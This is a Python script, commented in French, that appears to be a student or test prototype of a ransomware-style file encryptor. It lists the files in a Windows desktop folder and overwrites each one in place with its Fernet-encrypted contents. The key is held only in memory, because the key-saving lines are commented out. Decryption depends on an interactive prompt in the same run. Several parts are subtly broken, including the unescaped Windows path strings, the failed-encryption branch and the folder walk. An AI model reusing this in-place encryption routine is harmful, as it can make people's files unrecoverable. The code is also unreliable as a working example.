# coding=utf-8
import os
import glob


#----------------------------------------------------------------------
# Fonction de création d'une liste des fichiers et dossier d'un dossier
# chemins complets
#----------------------------------------------------------------------
def F_listeFichiers(fichier):
    liste_Chemins = []
    liste_Chemins = glob.glob(fichier)
    print(liste_Chemins)
    return (liste_Chemins)
#-------------------------
# Fonction de chiffrement
#-------------------------

def F_chiffrement(fichier, fernet_key):

    # ouverture et lecture du fichier à chiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # chiffrement du fichier en entier avec le module fernet
    try:
        encrypted = fernet_key.encrypt(data)
        print("Valid Key -", fichier, "- Successfully encrypted")
    except:
        print("Invalid Key -", fichier, "- Unsuccessfully encrypted")

    # ecriture dans le fichier lui même de son contenu chiffré
    with open(fichier, 'wb') as file:
        file.write(encrypted)  # Write the encrypted bytes to the output file

#---------------------------
# Fonction de déchiffrement
#---------------------------
def F_dechiffrement(fichier, fernet_key) :

  # récupération de la clé de chiffrement
  #  fichier_key = open('key.key', 'rb')
  #  key = fichier_key.read()
  #  fernet_key = Fernet(key)
  #  fichier_key.close()

    # ouverture et lecture du fichier à déchiffrer en mode binaire (byte)
    with open(fichier, 'rb') as file:
        data = file.read()  # Read the bytes of the input file

    # déchiffrement du fichier en entier avec le module fernet
    try:
        decrypted = fernet_key.decrypt(data)
        print("Valid Key - Successfully decrypted")
    except:
        print("Invalid Key - Unsuccessfully decrypted")

    # ecriture dans le fichier lui même de son contenu déchiffré
    with open(fichier, 'wb') as file:
        file.write(decrypted)  # Write the encrypted bytes to the output file


#-----------------------------------------------------------------------------------------------------------
# Boucle principale
#-----------------------------------------------------------------------------------------------------------

for root, dirs, files in os.walk('C:\Users\Admin\Desktop\Test P1\*', topdown = True):
    for name in files:
        print(dirs)
    for name in dirs:
        print(files)
#for dossier in destination:
#    for root, dirs, files in os.walk(dossier):
#        for file in files:
#            chemin_complet = os.path.join(root, file)
#            encrypt_file(key, chemin_complet)


# génération d'une clé de chiffrement avec le module fernet
from cryptography.fernet import Fernet
key = Fernet.generate_key()
fernet_key = Fernet(key)
# enregistrement de la clé dans un fichier_key
#fichier_key = open('key.key', 'wb')  # Open the file as wb to write bytes
#fichier_key.write(key)  # The key is type bytes still
#fichier_key.close()

# variables
i = 0
fichier = 'C:\Users\Admin\Desktop\Test P1\*'
rang = 0
liste_Fichiers = []

while i == 0:
    liste_Fichiers = F_listeFichiers(fichier)
    for fichier in liste_Fichiers:
        try:
            fichier = liste_Fichiers[rang]
        except IndexError:
            i = 1
        else:
            # c'est un fichier ou un dossier ?
            if os.path.isfile(fichier) == True:
                F_chiffrement(fichier, fernet_key)
                rang += 1
            else:
                print("C'est un dossier" + fichier)
                rang += 1
                if glob.glob(fichier) == ' ':
                    print("Ce dossier est vide")
                    #  break


    i = 1

#-----------------------------
# Pour les tests je décrypte
#-----------------------------

j = 0
reponse = " "
fichier = 'C:\Users\Admin\Desktop\Test P1\*'

while j == 0:
    reponse = input('Voulez-vous déchiffrer le dossier/fichier ? : ')
    if reponse in ["Y", "y"]:
        k = 0
        rang = 0
        while k == 0:
            try:
                fichier = liste_Fichiers[rang]
            except IndexError:
                k = 1
                j = 1
            else:
                if os.path.isfile(fichier) == True:
                    F_dechiffrement(fichier, fernet_key)
                    rang += 1
                else:
                    fichier = F_listeFichiers(fichier)
                    break
    elif reponse in ["N", "n"]:
        j = 1
        break
    else:
        print("Y ou N")
        pass




# liste des fichiers contenus dans un répertoire
#import os
#liste_fichier = os.listdir('c:\Users\Admin\Desktop\Test P1')
#print(liste_fichier)


# est-ce un fichier? taille d’un fichier? supprimer un fichier?
#os.path.isfile(path)
#os.path.getsize(path)
#os.remove(path)